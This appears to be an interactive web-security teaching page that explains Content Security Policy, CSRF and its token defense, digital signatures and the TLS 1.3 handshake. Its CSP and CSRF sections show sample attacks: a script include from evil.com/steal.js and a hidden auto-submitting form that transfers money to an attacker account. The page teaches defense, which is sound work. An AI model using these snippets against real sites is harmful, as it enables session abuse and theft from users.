Content Security Policy Headers

CSP restricts which resources the browser may load — among the most effective XSS mitigations available.

Without CSP — Vulnerable

// No CSP — everything runs <script src="https://evil.com/steal.js"></script> <script>eval(atob('YWxlcnQoMSk='))</script> <button onclick="stealData()">Click</button>
All external & inline scripts permitted

With CSP — Protected

Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'; frame-ancestors 'none' X-Frame-Options: DENY X-Content-Type-Options: nosniff
Only same-origin scripts with valid nonce load

CSRF — Cross-Site Request Forgery

Tricks authenticated users into submitting malicious requests using their active session cookie.

SecureBank Transfer

Logged in as alice $10,000
Transfer status...

Attacker's evil.com

This auto-submitting form is invisible — it fires using the victim's session cookie.

<!-- evil.com/free-prize.html --> <form action="bank.com/transfer" method="POST" id="f"> <input name="to" value="9999-ATTACKER"> <input name="amount" value="5000"> </form> <script>f.submit()</script>
Browser auto-sends alice's cookie — bank can't distinguish it!
CSRF token mismatch — evil.com has no valid token — 403 Forbidden.

Defense: Synchronizer Token Pattern

// SERVER: Generate token per session const tok = crypto.randomBytes(32).toString('hex') session.csrfToken = tok // Embed in every form <input type="hidden" name="_csrf" value="<%=tok%>"> // Validate on every POST if (req.body._csrf !== session.csrfToken) { return res.status(403).send('CSRF Blocked') }
Unique per session — attacker cannot guess it
SameSite=Strict cookie also prevents cross-origin sending
Double Submit Cookie pattern as stateless alternative
Set SameSite=Lax on all session cookies

Digital Signatures (RSA Simulation)

Sign a message to see the digital signature...

How It Works

// SENDER (Alice) — private key const hash = SHA256(message) const sig = RSA_SIGN(hash, privateKey) // Send: {message, signature} // RECEIVER (Bob) — public key const h1 = SHA256(receivedMessage) const h2 = RSA_VERIFY(sig, publicKey) if (h1 === h2) → ✅ AUTHENTIC else → ❌ TAMPERED

Properties Guaranteed

Authentication — only Alice has the private key
Integrity — any change invalidates the signature
Non-repudiation — Alice cannot deny signing
Used in TLS, code signing, S/MIME, blockchain

TLS 1.3 Handshake

1. Client Hello → TLS 1.3, cipher suites 2. Server Hello → chosen cipher, certificate 3. Client verifies chain to trusted Root CA 4. Key Exchange (ECDHE) → shared secret 5. Session keys derived (AES-256-GCM) 6. All traffic encrypted + authenticated
Forward secrecy — past sessions safe if key leaked
Certificate pinning prevents MITM attacks

WPA2 uses AES-CCMP. WPA3 uses SAE — resistant to offline dictionary attacks.
